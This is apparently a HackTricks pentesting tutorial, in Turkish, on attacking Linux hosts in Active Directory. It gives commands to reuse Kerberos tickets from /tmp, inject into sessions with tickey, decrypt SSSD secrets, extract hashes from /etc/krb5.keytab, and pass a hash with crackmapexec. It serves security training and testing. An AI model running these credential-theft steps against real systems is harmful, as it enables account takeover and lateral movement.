# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% embed url="https://websec.nl/" %}

Bir linux makinesi, bir Active Directory ortamında da bulunabilir.

Bir AD'deki linux makinesi, **farklı CCACHE biletlerini dosyalar içinde saklıyor olabilir. Bu biletler, diğer kerberos biletleri gibi kullanılabilir ve kötüye kullanılabilir**. Bu biletleri okumak için, biletin kullanıcı sahibi olmanız veya makine içinde **root** olmanız gerekir.

## Enumeration

### Linux'tan AD enumeration

Linux'ta (veya Windows'ta bash'te) bir AD'ye erişiminiz varsa, AD'yi listelemek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) deneyebilirsiniz.

Ayrıca, **linux'tan AD'yi listelemenin diğer yollarını öğrenmek için** aşağıdaki sayfayı kontrol edebilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA, esasen **Unix** ortamları için Microsoft Windows **Active Directory**'ye açık kaynaklı bir **alternatif**'tir. Active Directory'ye benzer yönetim için tam bir **LDAP dizini** ile bir MIT **Kerberos** Anahtar Dağıtım Merkezi'ni birleştirir. CA ve RA sertifika yönetimi için Dogtag **Sertifika Sistemi**'ni kullanarak, akıllı kartlar da dahil olmak üzere **çok faktörlü** kimlik doğrulamayı destekler. Unix kimlik doğrulama süreçleri için SSSD entegre edilmiştir. Daha fazla bilgi için:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Biletlerle Oynama

### Pass The Ticket

Bu sayfada, **bir linux ana bilgisayarında kerberos biletlerini nerede bulabileceğinizi** göreceksiniz, bir sonraki sayfada bu CCache bilet formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) nasıl dönüştüreceğinizi ve ayrıca bir PTT saldırısı nasıl gerçekleştireceğinizi öğrenebilirsiniz:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmp'den CCACHE bilet yeniden kullanımı

CCACHE dosyaları, **Kerberos kimlik bilgilerini** saklamak için kullanılan ikili formatlardır ve genellikle `/tmp` içinde 600 izinleriyle saklanır. Bu dosyalar, kullanıcının UID'sine karşılık gelen **isim formatı, `krb5cc_%{uid}`,** ile tanımlanabilir. Kimlik doğrulama biletinin doğrulanması için, **`KRB5CCNAME`** ortam değişkeni, istenen bilet dosyasının yoluna ayarlanmalıdır, bu da yeniden kullanımını sağlar.

Kimlik doğrulama için kullanılan mevcut bileti `env | grep KRB5CCNAME` ile listeleyin. Format taşınabilir ve bilet, ortam değişkenini `export KRB5CCNAME=/tmp/ticket.ccache` ile ayarlayarak **yeniden kullanılabilir**. Kerberos bilet adı formatı `krb5cc_%{uid}` şeklindedir; burada uid, kullanıcının UID'sidir.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE bilet yeniden kullanımı anahtarlık üzerinden

**Bir işlemin belleğinde saklanan Kerberos biletleri çıkarılabilir**, özellikle makinenin ptrace koruması devre dışı bırakıldığında (`/proc/sys/kernel/yama/ptrace_scope`). Bu amaçla yararlı bir araç [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur; bu araç, oturumlara enjekte ederek biletleri `/tmp` dizinine dökme işlemini kolaylaştırır.

Bu aracı yapılandırmak ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu prosedür, çeşitli oturumlara enjekte etmeyi deneyecek ve başarıyı, çıkarılan biletleri `/tmp` dizininde `__krb_UID.ccache` adlandırma kuralıyla saklayarak gösterecektir.

### SSSD KCM'den CCACHE bilet yeniden kullanımı

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` yolunda tutar. İlgili anahtar, `/var/lib/sss/secrets/.secrets.mkey` yolunda gizli bir dosya olarak saklanır. Varsayılan olarak, anahtar yalnızca **root** izinleriniz varsa okunabilir.

\*\*`SSSDKCMExtractor` \*\* komutunu --database ve --key parametreleriyle çağırmak, veritabanını ayrıştıracak ve **gizli bilgileri şifre çözecektir**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Kimlik bilgisi önbellek Kerberos blob'u, Mimikatz/Rubeus'a geçirilebilecek kullanılabilir bir Kerberos CCache** dosyasına dönüştürülebilir.

### Keytab'tan CCACHE bilet yeniden kullanımı
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab dosyasından hesapları çıkar

Kök ayrıcalıklarıyla çalışan hizmetler için gerekli olan hizmet hesap anahtarları, **`/etc/krb5.keytab`** dosyalarında güvenli bir şekilde saklanır. Bu anahtarlar, hizmetler için şifreler gibi, sıkı bir gizlilik gerektirir.

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Bu araç, anahtar türü 23 olarak belirlendiğinde, kullanıcı kimlik doğrulaması için **NT Hash** dahil olmak üzere anahtar ayrıntılarını görüntülemek üzere tasarlanmıştır.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linux kullanıcıları için, **`KeyTabExtract`** RC4 HMAC hash'ini çıkarmak için işlevsellik sunar; bu, NTLM hash yeniden kullanımında kullanılabilir.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS'ta, **`bifrost`** anahtar dosyası analizi için bir araç olarak hizmet eder.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Çıkarılan hesap ve hash bilgilerini kullanarak, **`crackmapexec`** gibi araçlar kullanılarak sunuculara bağlantılar kurulabilir.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referanslar

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
